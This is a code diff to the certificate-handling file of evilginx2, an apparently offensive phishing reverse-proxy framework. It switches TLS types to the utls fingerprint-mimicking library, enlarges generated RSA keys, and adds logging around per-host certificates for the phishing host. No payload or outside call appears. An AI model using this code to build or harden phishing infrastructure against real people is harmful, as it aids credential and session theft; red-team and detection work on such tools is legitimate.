@@ -16,9 +16,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/kgretzky/evilginx2/log"
-
 	"github.com/caddyserver/certmagic"
+	"github.com/kgretzky/evilginx2/log"
+	utls "github.com/refraction-networking/utls"
 )
 
 type CertDb struct {
@@ -26,8 +26,8 @@ type CertDb struct {
 	magic     *certmagic.Config
 	cfg       *Config
 	ns        *Nameserver
-	caCert    tls.Certificate
-	tlsCache  map[string]*tls.Certificate
+	caCert    utls.Certificate
+	tlsCache  map[string]*utls.Certificate
 }
 
 func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
@@ -37,7 +37,7 @@ func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
 		cache_dir: cache_dir,
 		cfg:       cfg,
 		ns:        ns,
-		tlsCache:  make(map[string]*tls.Certificate),
+		tlsCache:  make(map[string]*utls.Certificate),
 	}
 
 	if err := os.MkdirAll(filepath.Join(cache_dir, "sites"), 0700); err != nil {
@@ -155,10 +155,12 @@ func (o *CertDb) generateCertificates() error {
 		}
 	}
 
-	o.caCert, err = tls.X509KeyPair(ca_cert, pkey)
+	o.caCert, err = utls.X509KeyPair(ca_cert, pkey)
 	if err != nil {
+		log.Error("reloadCertificates: X509KeyPair failed: %v", err)
 		return err
 	}
+	log.Debug("reloadCertificates: CA certificate loaded successfully")
 	return nil
 }
 
@@ -270,7 +272,7 @@ func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, er
 	return state.PeerCertificates[0], nil
 }
 
-func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
+func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *utls.Certificate, err error) {
 	var x509ca *x509.Certificate
 	var template x509.Certificate
 
@@ -330,18 +332,45 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 	}
 
 	var pkey *rsa.PrivateKey
-	if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
+	if pkey, err = rsa.GenerateKey(rand.Reader, 4096); err != nil {
 		return
 	}
 
 	var derBytes []byte
-	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey); err != nil {
+
+	// Type check and handle o.caCert.PrivateKey
+	var caPrivateKey interface{} = o.caCert.PrivateKey
+	var caKeyRSA *rsa.PrivateKey
+
+	// Try to assert as *rsa.PrivateKey
+	if k, ok := caPrivateKey.(*rsa.PrivateKey); ok {
+		caKeyRSA = k
+		log.Debug("getSelfSignedCertificate: CA private key is *rsa.PrivateKey")
+	} else {
+		log.Error("getSelfSignedCertificate: CA private key type assertion failed, type=%T", caPrivateKey)
+		return nil, fmt.Errorf("CA private key is not *rsa.PrivateKey")
+	}
+
+	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, caKeyRSA); err != nil {
+		log.Error("getSelfSignedCertificate: CreateCertificate failed: %v", err)
 		return
 	}
 
-	cert = &tls.Certificate{
+	cert = &utls.Certificate{
 		Certificate: [][]byte{derBytes, o.caCert.Certificate[0]},
 		PrivateKey:  pkey,
+	}
+
+	log.Debug("getSelfSignedCertificate: created certificate for %s", host)
+	log.Debug("  - cert_bytes=%d, ca_cert_bytes=%d", len(derBytes), len(o.caCert.Certificate[0]))
+	log.Debug("  - privkey_size=%d bits, chain=%d certs", len(pkey.D.Bytes())*8, len(cert.Certificate))
+
+	// Parse and validate certificate
+	if certParsed, err := x509.ParseCertificate(derBytes); err == nil {
+		log.Debug("  - subject=%s", certParsed.Subject.String())
+		log.Debug("  - issuer=%s", certParsed.Issuer.String())
+		log.Debug("  - valid_from=%s", certParsed.NotBefore.String())
+		log.Debug("  - valid_to=%s", certParsed.NotAfter.String())
 	}
 
 	o.tlsCache[host] = cert
